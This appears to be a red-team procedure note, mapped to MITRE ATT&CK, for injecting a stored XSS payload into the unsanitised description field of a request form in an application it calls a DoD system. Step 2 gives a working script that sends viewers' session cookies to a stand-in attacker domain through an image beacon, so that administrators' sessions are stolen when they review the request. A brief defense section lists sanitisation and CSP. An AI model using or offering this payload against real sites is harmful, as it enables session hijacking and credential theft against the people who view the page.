---
tags:
  - xss
  - payload-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:02.452Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 86364d60-b794-453c-a1b8-bd0304a44471
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Stored-XSS-Payload-in-Request

## Summary

This procedure details crafting and submitting a JavaScript payload into the unsanitized description field of a DoD request form, exploiting stored XSS to persist malicious code for later execution.

## Description

Stored XSS vulnerabilities occur when user input is stored (e.g., in a database) and later displayed without proper escaping. In this DoD application, the request description field lacks sanitization, allowing injected <script> tags to execute in the context of any user viewing the request, such as administrators. The payload is designed to exfiltrate session cookies to an attacker-controlled endpoint, enabling credential theft. Prerequisites include an authenticated session and a controlled server for receiving data.

## Requirements

1. Authenticated session from prior access procedure
2. Controlled web server or email logger (e.g., using ngrok for local testing or a VPS)
3. Knowledge of basic JavaScript for payload construction

## Defense

Defensive measures and detection strategies:

- Sanitize all user inputs with HTML entity encoding before storage and display
- Implement Content Security Policy (CSP) to restrict script execution
- Log and monitor form submissions for suspicious patterns like <script> tags

## Objectives

1. Persist malicious JavaScript in the application's database via the description field
2. Ensure the payload evades any basic client-side checks
3. Prepare for execution upon admin review of the request

## Instructions

### Step 1: Navigate to Request Form

**Context**: Locate the vulnerable input field.

No specific command; from the dashboard, go to https://███ and load the new request form.

> Form appears with description textarea ready for input.

### Step 2: Craft and Insert Payload

**Context**: Enter the XSS payload targeting session data exfiltration.

No specific command; in the description field, input: `<script>var i=new Image();i.src='http://your-attacker-domain.com/log?data='+encodeURIComponent(document.cookie);</script>`.

> Replace 'your-attacker-domain.com' with your logging endpoint. The payload uses a beacon (Image src) to silently send cookies without alerting the user.

### Step 3: Submit the Form

**Context**: Store the payload on the server.

No specific command; complete minimal required fields and submit.

> Submission succeeds, storing the payload. Note the request ID for later reference.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
